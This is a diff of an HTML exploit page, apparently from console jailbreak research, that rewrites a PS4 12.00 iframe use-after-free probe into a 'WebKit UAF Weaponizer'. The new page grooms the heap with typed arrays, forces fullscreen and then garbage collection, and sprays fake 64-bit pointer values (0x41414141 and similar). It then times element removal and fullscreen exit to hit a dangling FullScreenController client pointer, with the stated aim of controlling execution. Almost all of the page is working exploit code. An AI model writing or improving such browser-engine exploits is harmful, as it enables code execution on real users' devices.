@@ -2,131 +2,102 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Iframe UAF Probe (Corrected)</title>
+<title>PS4 12.00 - Weaponization Lab</title>
+<style>
+    body { background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 30px; }
+    button { padding: 15px; font-size: 16px; font-weight: bold; margin: 10px; cursor: pointer; border-radius: 5px; border: none;}
+    .btn-hijack1 { background-color: #cc0000; color: white; }
+    .btn-hijack2 { background-color: #aa00aa; color: white; }
+    .btn-timer { background-color: #0077cc; color: white; }
+    #log { margin-top: 20px; font-size: 16px; color: #0f0; font-family: monospace; }
+</style>
 </head>
 <body>
 
-<h2>PS4 12.00 - Iframe Post-Teardown Test</h2>
+<h2>WebKit UAF Weaponizer (PS4 12.00)</h2>
+<p>Selecione a carga de memória para provar o controle de execução (RCE).</p>
 
-<button onclick="startTest()">Start Test</button>
-<p>Após clicar, clique em "Run Inside Frame" e interaja com o prompt (OPTIONS).</p>
+<button class="btn-hijack1" onclick="runTest(1)">1. Injetar PC (0x41414141)</button>
+<button class="btn-hijack2" onclick="runTest(2)">2. Injetar PC (0x42424242)</button>
+<button class="btn-timer" onclick="runTest(3)">3. Sincronizar Animação (500ms)</button>
 
-<pre id="log" style="background:#111;color:#0f0;padding:10px;height:300px;overflow:auto;"></pre>
+<div id="log">Aguardando comando...</div>
 
 <script>
-function log(msg) {
-    document.getElementById("log").textContent += msg + "\n";
-}
+function runTest(mode) {
+    const log = document.getElementById("log");
+    log.innerHTML = "Preparando a memória...<br><b>Pressione OPTIONS agora!</b>";
 
-// O Parent vai guardar a REFERÊNCIA REAL da memória do iframe aqui
-var leakedArray = null;
+    let controllers = [];
 
-function startTest() {
-    log("[*] Creating iframe...");
+    // [1] Heap Grooming: Alocação inicial perfeita
+    for(let i = 0; i < 5000; i++) {
+        let arr = new Float64Array(8);
+        arr[0] = i;
+        controllers.push(arr);
+    }
 
-    const iframe = document.createElement("iframe");
-    iframe.style.width = "400px";
-    iframe.style.height = "200px";
-    document.body.appendChild(iframe);
+    // [2] Criação do Alvo (O nosso m_client no C++)
+    let fsTarget = document.createElement("div");
+    fsTarget.style.cssText = "position:absolute; top:0; left:0; width:100%; height:100%; background:black;";
+    fsTarget.innerHTML = "<h2 style='color:white; margin-top: 20%;'>Armadilha Ativa.<br>Aperte OPTIONS.</h2>";
+    document.body.appendChild(fsTarget);
 
-    // Usa setTimeout para garantir que o iframe está no DOM antes de escrever
-    setTimeout(() => {
-        const fWin = iframe.contentWindow;
-        const fDoc = fWin.document;
+    if (fsTarget.webkitRequestFullscreen) {
+        fsTarget.webkitRequestFullscreen();
+    }
 
-        if (!fDoc) {
-            log("[!] Erro: fDoc é null.");
-            return;
+    window.onblur = function() {
+        log.innerHTML += "<br>[*] Onblur detectado. Iniciando Exploração...";
+
+        // [3] Força GC (Libera a memória)
+        controllers = null;
+        for (let i = 0; i < 20000; i++) {
+            new ArrayBuffer(0x10000);
         }
 
-        fDoc.open();
-        fDoc.write(`
-            <html>
-            <body>
-            <button onclick="run()">Run Inside Frame</button>
-            <script>
-                // Aloca os arrays DENTRO do iframe
-                let controllers = [];
-                for (let i = 0; i < 5000; i++) {
-                    let arr = new Float64Array(8);
-                    arr[0] = 1337.1337 + i; // Valor reconhecível
-                    controllers.push(arr);
-                }
-
-                window.run = function() {
-                    if (document.documentElement.webkitRequestFullscreen) {
-                        document.documentElement.webkitRequestFullscreen();
-                    }
-
-                    window.onblur = function() {
-                        window.onblur = null; // Evita loop duplo
-
-                        // 1. VAZAMENTO DIRETO DE REFERÊNCIA (Sem postMessage)
-                        // Injetamos o array do iframe direto no escopo do Parent
-                        parent.leakedArray = controllers[0];
-                        parent.log("[+] Referência injetada no Parent direto do Iframe.");
-
-                        // 2. PREPARAR O CAOS (GC agressivo para bagunçar o heap do iframe)
-                        for (let i = 0; i < 20000; i++) {
-                            new ArrayBuffer(0x1000);
-                        }
-
-                        // 3. TEARDOWN CRÍTICO
-                        // Destrói o documento do iframe. A teoria do UAF diz que 
-                        // a memória do iframe será liberada, MAS o Parent ainda tem o ponteiro.
-                        parent.log("[*] Executando teardown (document.write)...");
-                        setTimeout(() => {
-                            document.open();
-                            document.write("<h1>Teardown</h1>");
-                            document.close();
-                        }, 500);
-                    };
-                };
-            <\/script>
-            </body>
-            </html>
-        `);
-        fDoc.close();
-    }, 50);
-
-    // =========================
-    // TESTES PÓS-TEARDOWN (Roda no Parent)
-    // =========================
-    setTimeout(() => {
-        log("[*] Running post-teardown tests...");
-
-        if (!leakedArray) {
-            log("[-] Nenhuma referência vazada encontrada. O ataque falhou antes do teardown.");
-            return;
-        }
-
-        // Teste A: Acesso básico
-        try {
-            log("[TEST A] Array access [0]: " + leakedArray[0]);
-            if (leakedArray[0] !== 1337.1337) {
-                log("    -> CORRUPÇÃO DETECTADA! Valor mudou pós-teardown.");
+        // [4] SPRAY ESTRUTURADO (Uint32Array para controle hexadecimal exato)
+        let spray = [];
+        let hexValue = 0x41414141; // Padrão
+        
+        if (mode === 2) hexValue = 0x42424242; // Mudança de payload
+        if (mode === 3) hexValue = 0x43434343; // C de Constante de Animação
+        
+        for(let i = 0; i < 15000; i++) {
+            let p = new Uint32Array(16); // 64 bytes (tamanho exato de um objeto Render/Node básico)
+            for(let j = 0; j < 16; j+=2) {
+                p[j] = hexValue;     // Low 32-bits
+                p[j+1] = hexValue;   // High 32-bits (Juntos formam o ponteiro 64-bit perfeito)
             }
-        } catch(e) {
-            log("[TEST A ERROR] (UAF mitificado/Crashou): " + e);
+            spray.push(p);
         }
 
-        // Teste B: Integridade de Metadados
-        try {
-            log("[TEST B] Buffer byteLength: " + leakedArray.buffer.byteLength);
-        } catch(e) {
-            log("[TEST B ERROR] " + e);
-        }
+        // [5] O Gatilho com Timing Baseado na Source do WebKit
+        setTimeout(() => {
+            try {
+                // Removemos o elemento (Criando o Dangling Pointer em FullScreenController::m_client)
+                fsTarget.remove(); 
+                
+                // Forçamos o uso do ponteiro envenenado (Chama fullScreenClientWillExitFullScreen)
+                if (document.webkitIsFullScreen || document.fullscreenElement) {
+                    document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
+                }
+            } catch(e) {
+                console.log(e);
+            }
 
-        // Teste C: Type Confusion induzida
-        try {
-            log("[TEST C] DataView access...");
-            let dv = new DataView(leakedArray.buffer);
-            log("    -> getUint32(0): 0x" + dv.getUint32(0, true).toString(16));
-        } catch(e) {
-            log("[TEST C ERROR] " + e);
-        }
-
-    }, 4000);
+            // [6] A Mágica do Tempo C++
+            if (mode === 1 || mode === 2) {
+                // No modo de injeção direta, pressionamos o motor rapidamente (fallback original)
+                setTimeout(() => location.reload(), 200); 
+            } else if (mode === 3) {
+                // No modo Sincronizado, batemos EXATAMENTE na constante kFullScreenAnimationDuration
+                // para acertar o callback `exitFullScreenRepaintCompleted()`
+                setTimeout(() => location.reload(), 500); 
+            }
+            
+        }, 3000);
+    };
 }
 </script>
 
